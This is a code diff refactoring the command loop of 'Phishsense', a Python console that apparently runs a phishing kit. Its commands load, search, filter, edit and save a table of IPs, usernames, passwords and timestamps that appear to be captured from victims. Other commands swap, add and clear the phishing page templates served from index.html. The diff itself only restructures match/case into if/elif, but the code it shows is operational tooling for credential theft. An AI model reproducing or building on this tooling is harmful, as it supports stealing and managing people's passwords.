@@ -400,9 +400,7 @@ def print_header():
     console.print(
         f"[cyan]Python Version:[/cyan] [green]{platform.python_version()}[/green]"
     )
-    console.print(
-        f"[cyan]Phishsense Version:[/cyan] [green]1.0.0[/green]"
-    )
+    console.print(f"[cyan]Phishsense Version:[/cyan] [green]1.0.0[/green]")
 
 
 def display_dataframe(df):
@@ -461,106 +459,115 @@ while cmd != "-q":
         console.print("[bold red]Command not found![/bold red]")
         helpcmd(cmds)
     else:
-        match cmd:
-            case "-a":
-                display_dataframe(df)
-            case "-ap":
-                print(ListeTypePages(os.getcwd() + "/typesPages.dat"))
-            case "-A":
-                console.print("[bold yellow]Adding new user...[/bold yellow]")
-                adduser()
-            case "-S":
-                console.print("[bold yellow]Resetting user...[/bold yellow]")
-                resetuser()
-            case "-RE":
-                print_header()
-                df = pd.read_csv(url, dtype=str, encoding="utf-8")
-                df = df[["ip", "user", "passwd", "datetime", "type"]]
-            case "-f":
-                with console.status(
-                    "[bold green]Filtering data...[/bold green]"
-                ) as status:
-                    felter()
-                    time.sleep(random.uniform(0.5, 1))
-                console.print("[bold green]Filter completed successfully![bold green]")
-            case "-r":
-                console.print("[bold yellow]Search Mode[bold yellow]")
-                type = input(
-                    Fore.CYAN + f"Type to find {list(df.columns)} >> " + Style.RESET_ALL
-                ).strip()
-                while type not in list(df.columns):
-                    if type == "-q":
-                        break
-                    console.print(
-                        f"[red]Invalid type! Choose from: {list(df.columns)}[/red]"
-                    )
-                    type = input(
-                        Fore.CYAN + "Type to find [-q quit] >> " + Style.RESET_ALL
-                    ).strip()
-                if type != "-q":
-                    ip = input(
-                        Fore.CYAN + f"Enter The {type} >>> " + Style.RESET_ALL
-                    ).strip()
-                    result = search(df, ip, type)
-                    if result.empty:
-                        console.print("[red]No results found![red]")
-                    else:
-                        display_dataframe(result)
-                else:
-                    console.print("[red]Search cancelled.[red]")
-            case "-s":
-                with console.status(
-                    "[bold green]Saving changes...[/bold green]"
-                ) as status:
-                    df.to_csv(url, encoding="utf-8")
-                    time.sleep(random.uniform(0.5, 1))
-                console.print("[bold green]✓ Changes saved successfully![bold green]")
-            case "-Sa":
-                console.print("[bold red]Warning: Resetting all data![bold red]")
-                df = pd.DataFrame(columns=df.columns)
-                display_dataframe(df)
-                console.print("[yellow]Use -s to save changes[yellow]")
-            case "-M":
-                console.print("[bold yellow]Modification Mode[bold yellow]")
-                type = "ip"
-                ip = input(Fore.CYAN + "Target IP >>> " + Style.RESET_ALL).strip()
-                while not (len(ip) > 5 and len(ip) <= 15 and (IpForma(ip))):
-                    if ip == "-q":
-                        break
-                    console.print("[red][!]Format: xxx.yyy.zzz.www[red]")
-                    ip = input(
-                        Fore.CYAN + "Target IP [-q quit] >>> " + Style.RESET_ALL
-                    ).strip()
-                try:
-                    if ip != "-q":
-                        UpdateUserData(ip, type)
-                    else:
-                        console.print("[red]Modification cancelled[red]")
-                except NameError:
-                    console.print("[red]Modification cancelled[red]")
-            case "-c":
-                print_header()
-            case "-h":
-                helpcmd(cmds)
-            case "-Cp":
-                changePage(os.getcwd() + "/typesPages.dat", os.getcwd() + "/index.html")
-            case "-Ap":
-                addPage(os.getcwd() + "/typesPages.dat")
-            case "-Sap":
-                try:
-                    open(os.getcwd() + "/index.html", "w", encoding="utf-8").close()
-                except FileNotFoundError:
-                    console.print("[bold red]File not found![bold red]")
-                    console.print(
-                        "[bold green]Make sure the file is in the same directory as this script.[bold green]"
-                    )
+        if cmd == "-a":
+            display_dataframe(df)
+
+        elif cmd == "-ap":
+            print(ListeTypePages(os.getcwd() + "/typesPages.dat"))
+
+        elif cmd == "-A":
+            console.print("[bold yellow]Adding new user...[/bold yellow]")
+            adduser()
+
+        elif cmd == "-S":
+            console.print("[bold yellow]Resetting user...[/bold yellow]")
+            resetuser()
+
+        elif cmd == "-RE":
+            print_header()
+            df = pd.read_csv(url, dtype=str, encoding="utf-8")
+            df = df[["ip", "user", "passwd", "datetime", "type"]]
+
+        elif cmd == "-f":
+            with console.status("[bold green]Filtering data...[/bold green]") as status:
+                felter()
+                time.sleep(random.uniform(0.5, 1))
+            console.print("[bold green]Filter completed successfully![bold green]")
+
+        elif cmd == "-r":
+            console.print("[bold yellow]Search Mode[bold yellow]")
+            type = input(
+                Fore.CYAN + f"Type to find {list(df.columns)} >> " + Style.RESET_ALL
+            ).strip()
+            while type not in list(df.columns):
+                if type == "-q":
+                    break
                 console.print(
-                    "[bold green]✓ HTML page cleared successfully![bold green]"
+                    f"[red]Invalid type! Choose from: {list(df.columns)}[/red]"
                 )
-            case "-Sp":
-                deleteType(os.getcwd() + "/typesPages.dat")
-            case "_":
-                console.print("[bold red]Command not found![bold red]")
+                type = input(
+                    Fore.CYAN + "Type to find [-q quit] >> " + Style.RESET_ALL
+                ).strip()
+            if type != "-q":
+                ip = input(
+                    Fore.CYAN + f"Enter The {type} >>> " + Style.RESET_ALL
+                ).strip()
+                result = search(df, ip, type)
+                if result.empty:
+                    console.print("[red]No results found![red]")
+                else:
+                    display_dataframe(result)
+            else:
+                console.print("[red]Search cancelled.[red]")
+
+        elif cmd == "-s":
+            with console.status("[bold green]Saving changes...[/bold green]") as status:
+                df.to_csv(url, encoding="utf-8")
+                time.sleep(random.uniform(0.5, 1))
+            console.print("[bold green]✓ Changes saved successfully![bold green]")
+
+        elif cmd == "-Sa":
+            console.print("[bold red]Warning: Resetting all data![bold red]")
+            df = pd.DataFrame(columns=df.columns)
+            display_dataframe(df)
+            console.print("[yellow]Use -s to save changes[yellow]")
+
+        elif cmd == "-M":
+            console.print("[bold yellow]Modification Mode[bold yellow]")
+            type = "ip"
+            ip = input(Fore.CYAN + "Target IP >>> " + Style.RESET_ALL).strip()
+            while not (len(ip) > 5 and len(ip) <= 15 and (IpForma(ip))):
+                if ip == "-q":
+                    break
+                console.print("[red][!]Format: xxx.yyy.zzz.www[red]")
+                ip = input(
+                    Fore.CYAN + "Target IP [-q quit] >>> " + Style.RESET_ALL
+                ).strip()
+            try:
+                if ip != "-q":
+                    UpdateUserData(ip, type)
+                else:
+                    console.print("[red]Modification cancelled[red]")
+            except NameError:
+                console.print("[red]Modification cancelled[red]")
+
+        elif cmd == "-c":
+            print_header()
+
+        elif cmd == "-h":
+            helpcmd(cmds)
+
+        elif cmd == "-Cp":
+            changePage(os.getcwd() + "/typesPages.dat", os.getcwd() + "/index.html")
+
+        elif cmd == "-Ap":
+            addPage(os.getcwd() + "/typesPages.dat")
+
+        elif cmd == "-Sap":
+            try:
+                open(os.getcwd() + "/index.html", "w", encoding="utf-8").close()
+            except FileNotFoundError:
+                console.print("[bold red]File not found![bold red]")
+                console.print(
+                    "[bold green]Make sure the file is in the same directory as this script.[bold green]"
+                )
+            console.print("[bold green]✓ HTML page cleared successfully![bold green]")
+
+        elif cmd == "-Sp":
+            deleteType(os.getcwd() + "/typesPages.dat")
+
+        else:
+            console.print("[bold red]Command not found![bold red]")
 
     console.print(
         "[bold cyan]Enter command [bold cyan]([green]'-h'[green][bold cyan] for help):[bold cyan]"
